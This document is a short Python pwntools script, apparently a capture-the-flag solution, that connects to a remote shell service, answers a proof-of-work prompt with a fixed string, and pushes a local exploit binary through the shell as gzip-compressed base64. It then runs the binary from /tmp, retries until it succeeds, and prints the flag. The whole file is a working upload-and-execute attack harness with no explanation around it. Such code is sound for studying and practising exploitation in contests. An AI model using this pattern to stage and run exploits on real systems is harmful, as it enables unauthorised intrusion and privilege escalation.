#!/usr/bin/env python3

from pwn import *
import os
import sys

url = sys.argv[1].split(":")

os.system("cat exploit | gzip | base64 > exploit.b64")
with open("exploit.b64", "r") as f:
        data = f.read()

win = False
while not win:
    try:
        io = remote(url[0], int(url[1]))
        io.sendlineafter(b"hashcash", b"JOMVET_THE_DOG")

        io.sendlineafter(b"~ $ ", (f"echo '''{data}''' | base64 -d | gunzip > /tmp/exploit; chmod +x /tmp/exploit").encode())


        io.sendlineafter(b"~ $ ", b"/tmp/exploit")

        io.sendlineafter(b"~ $ ", b"ls /tmp")

        if b"flag.txt" in io.recvuntil(b"~ $ "):
            io.sendline(b"cat /tmp/flag.txt")
            io.recvuntil(b"TRX{")
            print("TRX{" + io.recvuntil(b"}").decode())
            win = True
        else:
            print("exploit failed, run again (the exploit is non deterministic, run it 5-10 times)")

    except:
        sleep(2)

    io.close()  